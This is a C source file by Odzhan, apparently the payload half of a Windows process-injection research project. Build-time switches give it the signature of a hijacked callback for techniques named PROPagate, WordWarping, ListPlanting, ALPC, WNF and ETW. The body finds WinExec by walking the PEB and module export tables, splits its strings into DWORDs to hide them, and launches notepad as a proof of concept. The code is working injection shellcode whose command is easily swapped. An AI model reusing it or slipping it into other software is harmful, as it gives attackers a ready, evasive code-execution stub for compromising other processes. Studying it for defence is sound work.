/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../../NTlib//nttpp.h"

#include <evntrace.h>
#include <pla.h>
#include <wbemidl.h>
#include <wmistr.h>
#include <Evntcons.h>

typedef UINT (WINAPI *WinExec_t)(
  _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char*,char*);

#ifdef WINDOW        // Extra Window Bytes
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, 
  WPARAM wParam, LPARAM lParam)
#endif
  
#ifdef SVCCTRL       // Service Control Handler
DWORD Handler(DWORD dwControl)
#endif

#ifdef SUBCLASS      // PROPagate
LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, 
  LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
#endif

#ifdef WORDBREAK     // WordWarping
int Editwordbreakproca(LPSTR lpch, int ichCurrent, int cch, int code)
#endif

#ifdef HYPHENATE     // Hyphentension
void HyphenateProc(WCHAR *pszWord, LANGID langid, long ichExceed, 
  HYPHRESULT *phyphresult)
#endif

#ifdef AUTOCORRECT   // AutoCourgette
int Autocorrectproc(LANGID langid, const WCHAR *pszBefore, 
  WCHAR *pszAfter, LONG cchAfter, LONG *pcchReplaced)
#endif

#ifdef STREAM        // Streamception
DWORD Editstreamcallback(DWORD_PTR dwCookie, LPBYTE pbBuff,
  LONG cb, LONG *pcb)
#endif

#ifdef CLIPBOARD     // IRichEditOle::GetClipboardData method
HRESULT OleGetClipboardData(CHARRANGE *lpchrg, DWORD reco, LPDATAOBJECT *lplpdataobj)
#endif

#ifdef LVCOMPARE     // ListPlanting
int Pfnlvgroupcompare(int Arg1, int Arg2, void *ptr)
#endif

#ifdef TVCOMPARE     // TreePoline / TVSORTCB structure
int CALLBACK TvCompareFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
#endif

#ifdef CONSOLE       // ConsoleWindowClass
HWND GetWindowHandle(VOID)
#endif

#ifdef RELEASE       // Release method
VOID Release(VOID *This)
#endif

#ifdef QUERYINTERFACE
VOID QueryInterface(REFIID riid, void **ppvObject)
#endif

#ifdef ALPC          // Advanced Local Procedure Call (ALPC)
VOID TpAlpcCallBack(PTP_CALLBACK_INSTANCE Instance, 
  LPVOID Context, PTP_ALPC TpAlpc, LPVOID Reserved) 
#endif

#ifdef WINSOCK
INT WSHGetSocketInformation(
    PVOID  HelperDllSocketContext,
    SOCKET SocketHandle,
    HANDLE TdiAddressObjectHandle,
    HANDLE TdiConnectionObjectHandle,
    INT    Level,
    INT    OptionName,
    PCHAR  OptionValue,
    INT    OptionLength)
#endif

#ifdef CTRL
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
#endif

#ifdef DDE
HDDEDATA DDECallback(
  UINT wType,
  UINT wFmt,
  HCONV hConv,
  HSZ hsz1,
  HSZ hsz2,
  HDDEDATA hData,
  ULONG_PTR dwData1,
  ULONG_PTR dwData2)
#endif

#ifdef WNF
typedef struct _WNF_STATE_NAME {
    ULONG                             Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef const struct _WNF_STATE_NAME* PCWNF_STATE_NAME;

typedef struct _WNF_TYPE_ID {
    GUID                              TypeId;
} WNF_TYPE_ID, *PWNF_TYPE_ID;

typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;

typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

NTSTATUS WnfCallback (
    WNF_STATE_NAME                    StateName,
    WNF_CHANGE_STAMP                  ChangeStamp,
    PWNF_TYPE_ID                      TypeId,
    PVOID                             CallbackContext,
    PVOID                             Buffer,
    ULONG                             BufferSize)
#endif

#ifdef ETW
void WINAPI EtwEnableCallback (
  LPCGUID                  SourceId,
  ULONG                    IsEnabled,
  UCHAR                    Level,
  ULONGLONG                MatchAnyKeyword,
  ULONGLONG                MatchAllKeyword,
  PEVENT_FILTER_DESCRIPTOR FilterData,
  PVOID                    CallbackContext)
#endif

{
    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szNotepad[3];

    #ifdef ALPC
      PTP_ALPC_CALLBACK  pLrpcIoComplete;
      TP_SIMPLE_CALLBACK *tp=(TP_SIMPLE_CALLBACK*)Context;
      // Context should contain pointer to original callback structure
      pLrpcIoComplete = (PTP_ALPC_CALLBACK)tp->Function;
      // restore original values
      // this will indicate we executed ok,
      // but is also required before the call to WinExec
      TpAlpc->CallbackObject.Callback.Function = tp->Function;
      TpAlpc->CallbackObject.Callback.Context  = tp->Context;
    #endif
    
    // now call WinExec to start notepad
    szWinExec[0] = *(DWORD*)"WinE";
    szWinExec[1] = *(DWORD*)"xec\0";
    
    szNotepad[0] = *(DWORD*)"note";
    szNotepad[1] = *(DWORD*)"pad\0";

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szNotepad, SW_SHOW);
    }
    
    // if this is ALPC, pass the original message on..
    #ifdef ALPC 
      pLrpcIoComplete(Instance, TpAlpc->CallbackObject.Callback.Context, TpAlpc, Reserved);
    #endif
    
    // for EM_STREAMIN, indicate an error.
    #if defined(STREAM)
      return (DWORD)~0UL;
    #endif
    
    #if defined(CTRL)
      return TRUE;
    #endif
    
    #if !defined(ETW) && !defined(ALPC) && !defined(HYPHENATE) && !defined(RELEASE) && !defined(QUERYINTERFACE)
      return 0;
    #endif
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}
